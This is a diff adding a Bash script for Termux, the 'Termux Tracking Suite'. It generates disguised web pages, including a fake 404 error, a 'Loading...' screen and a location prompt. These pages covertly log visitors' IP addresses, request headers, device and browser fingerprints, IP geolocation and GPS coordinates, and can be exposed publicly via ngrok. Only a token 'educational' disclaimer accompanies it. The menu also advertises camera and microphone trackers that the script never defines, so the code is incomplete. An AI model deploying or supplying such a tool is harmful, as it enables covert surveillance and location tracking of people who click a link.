@@ -1,0 +1,651 @@
+#!/bin/bash
+
+# ================================
+# 🎨 SYSTEM COLOR CONFIG
+# ================================
+RED='\033[1;91m'
+GREEN='\033[1;92m'
+YELLOW='\033[1;93m'
+BLUE='\033[1;94m'
+PURPLE='\033[1;95m'
+CYAN='\033[1;96m'
+WHITE='\033[1;97m'
+ORANGE='\033[1;38;5;214m'
+NEON='\033[1;38;5;46m'
+PINK='\033[1;38;5;205m'
+GOLD='\033[1;38;5;220m'
+NC='\033[0m'
+
+BOLD='\033[1m'
+UNDERLINE='\033[4m'
+BLINK='\033[5m'
+
+# ================================
+# 🔧 GLOBAL VARIABLES
+# ================================
+VERSION="3.0.0"
+AUTHOR="Termux Tracking Suite"
+SESSION_ID=$(date +%Y%m%d_%H%M%S)
+TRACKING_DIR="tracking_server"
+LOG_FILE="tracking.log"
+WEBHOOK_URL=""
+NGROK_TOKEN=""
+SERVER_PORT="8080"
+
+# ================================
+# 🎭 BANNER SYSTEM
+# ================================
+show_banner() {
+    clear
+    echo -e "${PURPLE}"
+    cat << "BANNER"
+╔═══╗╔╗ ╔╗╔═══╗╔═══╗╔╗   ╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗
+║╔══╝║║ ║║║╔══╝║╔══╝║║   ║╔═╗║║╔═╗║║╔═╗║║╔═╗║║╔══╝
+║╚══╗║║ ║║║╚══╗║╚══╗║║   ║╚═╝║║╚═╝║║╚═╝║║╚═╝║║╚══╗
+║╔══╝║║ ║║║╔══╝║╔══╝║║ ╔╗║╔╗╔╝║╔╗╔╝║╔╗╔╝║╔╗╔╝║╔══╝
+║╚══╗║╚═╝║║╚══╗║╚══╗║╚═╝║║║║╚╗║║║╚╗║║║╚╗║║║╚╗║╚══╗
+╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚╝╚═╝╚╝╚═╝╚╝╚═╝╚╝╚═╝╚═══╝
+BANNER
+    echo -e "${CYAN}"
+    cat << "BANNER2"
+╔═════════════════════════════════════════════════════════════════════════╗
+║                        TERMUX TRACKING SUITE v3.0                       ║
+║                 Advanced Link Tracking & Information Gathering          ║
+║                                                                         ║
+║                  Created For Educational Purposes Only                 ║
+╚═════════════════════════════════════════════════════════════════════════╝
+BANNER2
+    echo -e "${GOLD}                          Author: $AUTHOR | Version: $VERSION${NC}"
+    echo -e "${CYAN}=========================================================================${NC}"
+}
+
+# ================================
+# 🚀 INITIALIZATION
+# ================================
+initialize() {
+    echo -e "${BLUE}[*] Initializing Termux Tracking Suite...${NC}"
+    
+    # Create necessary directories
+    mkdir -p $TRACKING_DIR
+    mkdir -p logs
+    mkdir -p data
+    
+    # Check dependencies
+    check_dependencies
+}
+
+check_dependencies() {
+    echo -e "${BLUE}[*] Checking dependencies...${NC}"
+    
+    local deps=("php" "curl" "wget" "jq")
+    local missing=()
+    
+    for dep in "${deps[@]}"; do
+        if ! command -v "$dep" &> /dev/null; then
+            missing+=("$dep")
+        fi
+    done
+    
+    if [ ${#missing[@]} -gt 0 ]; then
+        echo -e "${YELLOW}[!] Installing missing dependencies...${NC}"
+        pkg update -y
+        pkg install -y "${missing[@]}"
+    fi
+    
+    echo -e "${GREEN}[+] All dependencies are installed${NC}"
+}
+
+# ================================
+# 🔗 TRACKING LINK GENERATOR
+# ================================
+create_tracking_link() {
+    echo -e "${CYAN}"
+    cat << "MENU"
+╔═════════════════════════════════════════════════════════════════════════╗
+║                         TRACKING LINK GENERATOR                         ║
+╠═════════════════════════════════════════════════════════════════════════╣
+║  [1] 🌐 Basic Tracking Link (IP + Device Info)                         ║
+║  [2] 📱 Advanced Mobile Tracker (Full Device Info)                     ║
+║  [3] 📍 Location Tracking Link (GPS Attempt)                           ║
+║  [4] 📸 Camera Access Link (Camera Capture Attempt)                    ║
+║  [5] 🎤 Microphone Access Link (Audio Capture Attempt)                 ║
+║  [6] 💀 Ultimate Tracker (All Features Combined)                       ║
+║  [7] ↩️ Back to Main Menu                                              ║
+╚═════════════════════════════════════════════════════════════════════════╝
+MENU
+    echo -e "${NC}"
+    
+    read -p "Select option [1-7]: " choice
+    
+    case $choice in
+        1) create_basic_tracker ;;
+        2) create_advanced_tracker ;;
+        3) create_location_tracker ;;
+        4) create_camera_tracker ;;
+        5) create_microphone_tracker ;;
+        6) create_ultimate_tracker ;;
+        7) return ;;
+        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
+    esac
+}
+
+create_basic_tracker() {
+    local track_id="basic_$(date +%s)"
+    local tracker_dir="$TRACKING_DIR/$track_id"
+    mkdir -p "$tracker_dir"
+    
+    cat > "$tracker_dir/index.php" << 'EOF'
+<?php
+// Basic IP and Device Information Tracker
+$data = [
+    'timestamp' => date('Y-m-d H:i:s'),
+    'ip' => $_SERVER['REMOTE_ADDR'],
+    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+    'referrer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
+    'language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'],
+    'method' => $_SERVER['REQUEST_METHOD']
+];
+
+// Get additional IP information
+$ip_info = @json_decode(file_get_contents("http://ip-api.com/json/{$data['ip']}"), true);
+if ($ip_info && $ip_info['status'] == 'success') {
+    $data['geolocation'] = $ip_info;
+}
+
+// Log the data
+file_put_contents('tracked_data.log', print_r($data, true) . "\n", FILE_APPEND);
+
+// Serve a harmless page
+header('Content-Type: text/html');
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Page Not Found</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .error { color: #666; font-size: 18px; }
+    </style>
+</head>
+<body>
+    <h1>404 - Page Not Found</h1>
+    <p class="error">The page you are looking for doesn't exist.</p>
+</body>
+</html>
+EOF
+
+    setup_server "$track_id" "Basic Tracker"
+}
+
+create_advanced_tracker() {
+    local track_id="advanced_$(date +%s)"
+    local tracker_dir="$TRACKING_DIR/$track_id"
+    mkdir -p "$tracker_dir"
+    
+    cat > "$tracker_dir/index.php" << 'EOF'
+<?php
+// Advanced Device Information Tracker
+$data = [
+    'timestamp' => date('Y-m-d H:i:s'),
+    'ip' => $_SERVER['REMOTE_ADDR'],
+    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+    'headers' => getallheaders(),
+    'server_info' => [
+        'software' => $_SERVER['SERVER_SOFTWARE'],
+        'port' => $_SERVER['SERVER_PORT'],
+        'name' => $_SERVER['SERVER_NAME']
+    ]
+];
+
+// Enhanced device detection
+$user_agent = $data['user_agent'];
+$data['device'] = [
+    'is_mobile' => preg_match('/Mobile|Android|iPhone/i', $user_agent),
+    'is_bot' => preg_match('/bot|crawl|spider/i', $user_agent),
+    'browser' => get_browser(null, true)
+];
+
+// Log the data
+file_put_contents('tracked_data.log', print_r($data, true) . "\n", FILE_APPEND);
+
+// Serve tracking page with JavaScript
+header('Content-Type: text/html');
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        // Collect additional client information
+        var clientInfo = {
+            screen: { width: screen.width, height: screen.height, depth: screen.colorDepth },
+            viewport: { width: window.innerWidth, height: window.innerHeight },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            languages: navigator.languages,
+            cookies: navigator.cookieEnabled,
+            platform: navigator.platform,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown'
+        };
+        
+        // Send to server
+        fetch('log.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(clientInfo)
+        });
+    </script>
+</head>
+<body>
+    <h1>Content Loading...</h1>
+    <p>Please wait while we load the content.</p>
+</body>
+</html>
+EOF
+
+    # Create logging endpoint
+    cat > "$tracker_dir/log.php" << 'EOF'
+<?php
+$client_data = json_decode(file_get_contents('php://input'), true);
+if ($client_data) {
+    file_put_contents('client_data.log', print_r($client_data, true) . "\n", FILE_APPEND);
+}
+?>
+EOF
+
+    setup_server "$track_id" "Advanced Tracker"
+}
+
+create_location_tracker() {
+    local track_id="location_$(date +%s)"
+    local tracker_dir="$TRACKING_DIR/$track_id"
+    mkdir -p "$tracker_dir"
+    
+    cat > "$tracker_dir/index.php" << 'EOF'
+<?php
+// Location Tracking Attempt
+$data = [
+    'timestamp' => date('Y-m-d H:i:s'),
+    'ip' => $_SERVER['REMOTE_ADDR'],
+    'basic_info' => [
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+        'language' => $_SERVER['HTTP_ACCEPT_LANGUAGE']
+    ]
+];
+
+file_put_contents('access.log', print_r($data, true) . "\n", FILE_APPEND);
+
+header('Content-Type: text/html');
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Required</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        var locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        // Send location to server
+                        fetch('location.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(locationData)
+                        });
+                    },
+                    function(error) {
+                        console.log('Location access denied:', error);
+                    }
+                );
+            }
+        }
+        
+        window.onload = getLocation;
+    </script>
+</head>
+<body>
+    <h1>Location Services</h1>
+    <p>This page requires location access to function properly.</p>
+</body>
+</html>
+EOF
+
+    cat > "$tracker_dir/location.php" << 'EOF'
+<?php
+$location_data = json_decode(file_get_contents('php://input'), true);
+if ($location_data) {
+    file_put_contents('location_data.log', print_r($location_data, true) . "\n", FILE_APPEND);
+    echo json_encode(['status' => 'success']);
+}
+?>
+EOF
+
+    setup_server "$track_id" "Location Tracker"
+}
+
+# ================================
+# 🔧 SERVER SETUP
+# ================================
+setup_server() {
+    local track_id="$1"
+    local track_type="$2"
+    local tracker_dir="$TRACKING_DIR/$track_id"
+    
+    echo -e "${GREEN}[+] Creating $track_type...${NC}"
+    
+    # Start PHP server
+    cd "$tracker_dir"
+    php -S 127.0.0.1:$SERVER_PORT > /dev/null 2>&1 &
+    local server_pid=$!
+    echo $server_pid > server.pid
+    
+    cd - > /dev/null
+    
+    echo -e "${GREEN}[+] Local server started on port $SERVER_PORT${NC}"
+    echo -e "${YELLOW}[*] Server PID: $server_pid${NC}"
+    
+    # Ask for ngrok setup
+    read -p "Do you want to expose this server to internet using ngrok? (y/n): " use_ngrok
+    
+    if [[ $use_ngrok =~ ^[Yy]$ ]]; then
+        setup_ngrok "$track_id"
+    else
+        echo -e "${YELLOW}[*] Local URL: http://127.0.0.1:$SERVER_PORT${NC}"
+        echo -e "${YELLOW}[*] Use 'ifconfig' to find your local IP for network access${NC}"
+    fi
+    
+    show_tracking_urls "$track_id"
+}
+
+setup_ngrok() {
+    local track_id="$1"
+    local tracker_dir="$TRACKING_DIR/$track_id"
+    
+    echo -e "${BLUE}[*] Setting up ngrok...${NC}"
+    
+    # Check if ngrok is installed
+    if ! command -v ngrok &> /dev/null; then
+        echo -e "${YELLOW}[!] ngrok not found. Installing...${NC}"
+        pkg install -y wget unzip
+        wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
+        tar xvzf ngrok-v3-stable-linux-arm64.tgz
+        mv ngrok /data/data/com.termux/files/usr/bin/
+        chmod +x /data/data/com.termux/files/usr/bin/ngrok
+        rm ngrok-v3-stable-linux-arm64.tgz
+    fi
+    
+    # Start ngrok
+    cd "$tracker_dir"
+    ngrok http $SERVER_PORT > ngrok.log 2>&1 &
+    local ngrok_pid=$!
+    echo $ngrok_pid > ngrok.pid
+    
+    sleep 5  # Wait for ngrok to start
+    
+    # Get public URL
+    local ngrok_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+    
+    if [[ -n "$ngrok_url" ]]; then
+        echo -e "${GREEN}[+] Ngrok tunnel created: $ngrok_url${NC}"
+        echo "$ngrok_url" > public_url.txt
+    else
+        echo -e "${RED}[!] Failed to get ngrok URL${NC}"
+    fi
+    
+    cd - > /dev/null
+}
+
+# ================================
+# 📊 DATA VIEWER
+# ================================
+view_tracking_data() {
+    echo -e "${CYAN}"
+    cat << "MENU"
+╔═════════════════════════════════════════════════════════════════════════╗
+║                          TRACKING DATA VIEWER                           ║
+╠═════════════════════════════════════════════════════════════════════════╣
+║  [1] 📈 View Active Tracking Sessions                                  ║
+║  [2] 📋 View Collected Data                                            ║
+║  [3] 🗺️ View Geolocation Data                                          ║
+║  [4] 📱 View Device Information                                        ║
+║  [5] 🧹 Clear All Data                                                 ║
+║  [6] ↩️ Back to Main Menu                                              ║
+╚═════════════════════════════════════════════════════════════════════════╝
+MENU
+    echo -e "${NC}"
+    
+    read -p "Select option [1-6]: " choice
+    
+    case $choice in
+        1) view_active_sessions ;;
+        2) view_collected_data ;;
+        3) view_geolocation_data ;;
+        4) view_device_info ;;
+        5) clear_all_data ;;
+        6) return ;;
+        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
+    esac
+}
+
+view_active_sessions() {
+    echo -e "${GREEN}[*] Active Tracking Sessions:${NC}"
+    echo -e "${CYAN}=========================${NC}"
+    
+    for session in "$TRACKING_DIR"/*; do
+        if [[ -d "$session" ]]; then
+            local session_id=$(basename "$session")
+            local pid_file="$session/server.pid"
+            local url_file="$session/public_url.txt"
+            
+            if [[ -f "$pid_file" ]]; then
+                local pid=$(cat "$pid_file")
+                if ps -p "$pid" > /dev/null 2>&1; then
+                    echo -e "${GREEN}✓ ACTIVE - $session_id${NC}"
+                    if [[ -f "$url_file" ]]; then
+                        local url=$(cat "$url_file")
+                        echo -e "  URL: $url"
+                    else
+                        echo -e "  URL: http://127.0.0.1:$SERVER_PORT (Local)"
+                    fi
+                else
+                    echo -e "${RED}✗ INACTIVE - $session_id${NC}"
+                fi
+            fi
+        fi
+    done
+}
+
+view_collected_data() {
+    echo -e "${GREEN}[*] Collected Data:${NC}"
+    echo -e "${CYAN}=================${NC}"
+    
+    for session in "$TRACKING_DIR"/*; do
+        if [[ -d "$session" ]]; then
+            local session_id=$(basename "$session")
+            echo -e "\n${YELLOW}Session: $session_id${NC}"
+            
+            # Find and display log files
+            for log_file in "$session"/*.log; do
+                if [[ -f "$log_file" ]]; then
+                    echo -e "\n${GREEN}File: $(basename "$log_file")${NC}"
+                    tail -10 "$log_file" 2>/dev/null | while read line; do
+                        echo -e "  $line"
+                    done
+                fi
+            done
+        fi
+    done
+}
+
+# ================================
+# 🔗 URL MANAGEMENT
+# ================================
+show_tracking_urls() {
+    local track_id="$1"
+    local tracker_dir="$TRACKING_DIR/$track_id"
+    local url_file="$tracker_dir/public_url.txt"
+    
+    echo -e "${GREEN}"
+    echo "╔═════════════════════════════════════════════════════════════════════════╗"
+    echo "║                         TRACKING URL GENERATED                         ║"
+    echo "╠═════════════════════════════════════════════════════════════════════════╣"
+    echo "║                                                                         ║"
+    
+    if [[ -f "$url_file" ]]; then
+        local public_url=$(cat "$url_file")
+        echo -e "║   🌐 Public URL: $public_url"
+    else
+        echo -e "║   🏠 Local URL: http://127.0.0.1:$SERVER_PORT"
+        echo -e "║   📡 Network URL: http://$(ip route get 1 | awk '{print $7}'):$SERVER_PORT"
+    fi
+    
+    echo "║                                                                         ║"
+    echo "║   📝 Session ID: $track_id                                              "
+    echo "║   ⏰ Started: $(date)                             "
+    echo "║                                                                         ║"
+    echo "╚═════════════════════════════════════════════════════════════════════════╝"
+    echo -e "${NC}"
+}
+
+# ================================
+# 🛠️ UTILITIES
+# ================================
+check_dependencies() {
+    echo -e "${BLUE}[*] Checking dependencies...${NC}"
+    
+    local deps=("php" "curl" "wget" "jq")
+    local missing=()
+    
+    for dep in "${deps[@]}"; do
+        if ! command -v "$dep" &> /dev/null; then
+            missing+=("$dep")
+        fi
+    done
+    
+    if [ ${#missing[@]} -gt 0 ]; then
+        echo -e "${YELLOW}[!] Installing missing dependencies...${NC}"
+        pkg update -y
+        pkg install -y "${missing[@]}"
+        echo -e "${GREEN}[+] Dependencies installed successfully${NC}"
+    else
+        echo -e "${GREEN}[+] All dependencies are installed${NC}"
+    fi
+}
+
+# ================================
+# 📱 MAIN MENU
+# ================================
+show_main_menu() {
+    while true; do
+        show_banner
+        echo -e "${CYAN}"
+        cat << "MAIN_MENU"
+╔═════════════════════════════════════════════════════════════════════════╗
+║                         TERMUX TRACKING SUITE                          ║
+╠═════════════════════════════════════════════════════════════════════════╣
+║  [1] 🔗 Create Tracking Link                                           ║
+║  [2] 📊 View Collected Data                                            ║
+║  [3] ⚙️  Settings & Configuration                                       ║
+║  [4] 🛠️  Utilities & Tools                                             ║
+║  [5] 📚 Help & Documentation                                           ║
+║  [6] 🚪 Exit                                                           ║
+╚═════════════════════════════════════════════════════════════════════════╝
+MAIN_MENU
+        echo -e "${NC}"
+        
+        read -p "Select option [1-6]: " choice
+        
+        case $choice in
+            1) create_tracking_link ;;
+            2) view_tracking_data ;;
+            3) show_settings ;;
+            4) show_utilities ;;
+            5) show_help ;;
+            6) exit_tool ;;
+            *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
+        esac
+    done
+}
+
+show_settings() {
+    echo -e "${YELLOW}[*] Settings Menu - Coming Soon${NC}"
+    sleep 2
+}
+
+show_utilities() {
+    echo -e "${YELLOW}[*] Utilities Menu - Coming Soon${NC}"
+    sleep 2
+}
+
+show_help() {
+    echo -e "${GREEN}"
+    cat << "HELP"
+╔═════════════════════════════════════════════════════════════════════════╗
+║                            HELP & DOCUMENTATION                         ║
+╠═════════════════════════════════════════════════════════════════════════╣
+║                                                                         ║
+║  🔗 Tracking Links:                                                     ║
+║     • Create various types of tracking links                            ║
+║     • Each link collects different information                          ║
+║     • Use ngrok for public access                                       ║
+║                                                                         ║
+║  📊 Data Collection:                                                    ║
+║     • IP Addresses & Geolocation                                        ║
+║     • Device Information & Browser Data                                 ║
+║     • Attempts for Location/Camera/Microphone                          ║
+║                                                                         ║
+║  ⚠️  Legal Notice:                                                      ║
+║     • For educational purposes only                                     ║
+║     • Only use on systems you own                                       ║
+║     • Get proper authorization                                          ║
+║                                                                         ║
+╚═════════════════════════════════════════════════════════════════════════╝
+HELP
+    echo -e "${NC}"
+    read -p "Press Enter to continue..."
+}
+
+exit_tool() {
+    echo -e "${GREEN}[+] Thank you for using Termux Tracking Suite!${NC}"
+    echo -e "${YELLOW}[*] Remember: Use responsibly and legally${NC}"
+    exit 0
+}
+
+# ================================
+# 🚀 MAIN EXECUTION
+# ================================
+main() {
+    # Legal warning
+    echo -e "${RED}"
+    cat << "WARNING"
+╔═════════════════════════════════════════════════════════════════════════╗
+║                            ⚠️ LEGAL WARNING ⚠️                          ║
+╠═════════════════════════════════════════════════════════════════════════╣
+║   THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY             ║
+║   USE ONLY ON SYSTEMS YOU OWN OR HAVE EXPLICIT PERMISSION TO TEST      ║
+║   UNAUTHORIZED USE MAY VIOLATE LAWS AND REGULATIONS                   ║
+║   YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS                          ║
+╚═════════════════════════════════════════════════════════════════════════╝
+WARNING
+    echo -e "${NC}"
+    
+    read -p "Do you agree to use this tool responsibly? (y/n): " agree
+    if [[ ! $agree =~ ^[Yy]$ ]]; then
+        echo -e "${RED}[!] Exiting...${NC}"
+        exit 1
+    fi
+    
+    # Initialize and start
+    initialize
+    show_main_menu
+}
+
+# Start the tool
+main "$@"
